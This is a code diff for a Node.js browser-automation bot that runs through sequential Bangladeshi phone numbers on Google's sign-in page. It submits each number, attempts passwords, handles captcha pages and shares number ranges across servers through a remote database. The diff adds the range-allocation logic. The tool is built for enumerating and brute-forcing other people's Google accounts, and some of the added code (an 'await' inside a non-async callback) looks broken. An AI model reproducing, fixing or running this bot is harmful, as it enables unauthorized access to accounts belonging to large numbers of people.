@@ -112,12 +112,31 @@ module.exports = class {
                     if(output) {
                         mNumber++
                         this.mLoad++
-                        if(this.mLoad % 10 == 0) {
-                            console.log('ID:' +this.SIZE+' --- '+this.mLoad+' --- Null')
-                            this.database.child('server').child(this.SERVER).child('runing_'+this.SIZE).set(mNumber)
+                        if(this.mSirial+1 <= parseInt(mNumber/1000000)) {
+                            this.database.child('sirial').once('value', (snapshot) => {
+                                const value = snapshot.val()
+                                if(value != null) {
+                                    this.mSirial = parseInt(value[this.SIRIAL])
+                                    mNumber = parseInt(this.SIRIAL+this.mSirial+'000000')
+                                    this.database.child('sirial').child(this.SIRIAL).set(this.mSirial+1)
+                                    this.database.child('server').child(this.SERVER).child('runing_'+this.SIZE).set(mNumber)
+                                    this.database.child('server').child(this.SERVER).child('start_'+this.SIZE).set(parseInt(this.SIRIAL+this.mSirial))
+                                    if(this.mLoad % 10 == 0) {
+                                        console.log('ID:' +this.SIZE+' --- '+this.mLoad+' --- Null')
+                                        this.database.child('server').child(this.SERVER).child('runing_'+this.SIZE).set(mNumber)
+                                    }
+                                    await this.page.evaluate((number) => { let root = document.querySelector('input[type="email"]'); if(root) root.value = number }, '+880'+mNumber)
+                                    await this.page.evaluate(() => { try { let root = document.querySelector('#identifierNext'); if(root) root.click() } catch(e) {} })
+                                }
+                            })
+                        } else {
+                            if(this.mLoad % 10 == 0) {
+                                console.log('ID:' +this.SIZE+' --- '+this.mLoad+' --- Null')
+                                this.database.child('server').child(this.SERVER).child('runing_'+this.SIZE).set(mNumber)
+                            }
+                            await this.page.evaluate((number) => { let root = document.querySelector('input[type="email"]'); if(root) root.value = number }, '+880'+mNumber)
+                            await this.page.evaluate(() => { try { let root = document.querySelector('#identifierNext'); if(root) root.click() } catch(e) {} })
                         }
-                        await this.page.evaluate((number) => { let root = document.querySelector('input[type="email"]'); if(root) root.value = number }, '+880'+mNumber)
-                        await this.page.evaluate(() => { try { let root = document.querySelector('#identifierNext'); if(root) root.click() } catch(e) {} })
                     }
                 } else if(url.startsWith('https://accounts.google.com/generate') && mLoadSuccess) {
                     const output = await this.page.evaluate(() => {
@@ -165,7 +184,7 @@ module.exports = class {
                             await this.page.goto(this.signin)
                         }
                     }
-                }else if(url.startsWith('https://accounts.google.com/Captcha')) {
+                } else if(url.startsWith('https://accounts.google.com/Captcha')) {
                     if(!this.mCapture) {
                         this.mCapture = true
                         this.mPasswordTry = 0
@@ -208,8 +227,22 @@ module.exports = class {
             this.mPasswordTry = 0
             mNumber++
             this.mLoad++
-            this.database.child('server').child(this.SERVER).child('runing_'+this.SIZE).set(mNumber)
-            this.page.goBack()
+            if(this.mSirial+1 <= parseInt(mNumber/1000000)) {
+                this.database.child('sirial').once('value', (snapshot) => {
+                    const value = snapshot.val()
+                    if(value != null) {
+                        this.mSirial = parseInt(value[this.SIRIAL])
+                        mNumber = parseInt(this.SIRIAL+this.mSirial+'000000')
+                        this.database.child('sirial').child(this.SIRIAL).set(this.mSirial+1)
+                        this.database.child('server').child(this.SERVER).child('runing_'+this.SIZE).set(mNumber)
+                        this.database.child('server').child(this.SERVER).child('start_'+this.SIZE).set(parseInt(this.SIRIAL+this.mSirial))
+                        this.page.goBack()
+                    }
+                })
+            } else {
+                this.database.child('server').child(this.SERVER).child('runing_'+this.SIZE).set(mNumber)
+                this.page.goBack()
+            }
         } else {
             let password = ''
             if(this.mPasswordTry == 0) {
